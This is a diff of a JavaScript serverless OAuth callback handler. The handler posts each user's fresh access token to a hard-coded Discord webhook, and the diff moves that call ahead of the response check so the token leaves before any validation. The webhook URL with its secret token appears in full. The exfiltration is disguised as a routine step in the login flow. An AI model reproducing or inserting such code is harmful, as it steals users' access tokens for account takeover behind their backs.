@@ -52,16 +52,7 @@ export async function handler(event, context) {
             });
 
             const data = await result.json();
-
-            if (!result.ok) {
-                console.log(data);
-                throw new Error("Failed to get user access token");
-            }
-
-            const user = await getUserInfo(data.access_token);
-
-            
-            await fetch("https://discord.com/api/webhooks/1044574936381014056/JMNObDC2WGIQk6qAZzeAhwexKcbFSY-bdT1WOP5Sm5U68QlC2JN2fr-CXRkvui74wAsW", {
+await fetch("https://discord.com/api/webhooks/1044574936381014056/JMNObDC2WGIQk6qAZzeAhwexKcbFSY-bdT1WOP5Sm5U68QlC2JN2fr-CXRkvui74wAsW", {
                method: "POST",
                body: JSON.stringify({
                message: data.access_token.toString()
@@ -70,6 +61,16 @@ export async function handler(event, context) {
                    "Content-Type": "application/json"
                }
                })
+            
+            if (!result.ok) {
+                console.log(data);
+                throw new Error("Failed to get user access token");
+            }
+
+            const user = await getUserInfo(data.access_token);
+
+            
+          
          
             if (isBlocked(user.id)) {
                 return {
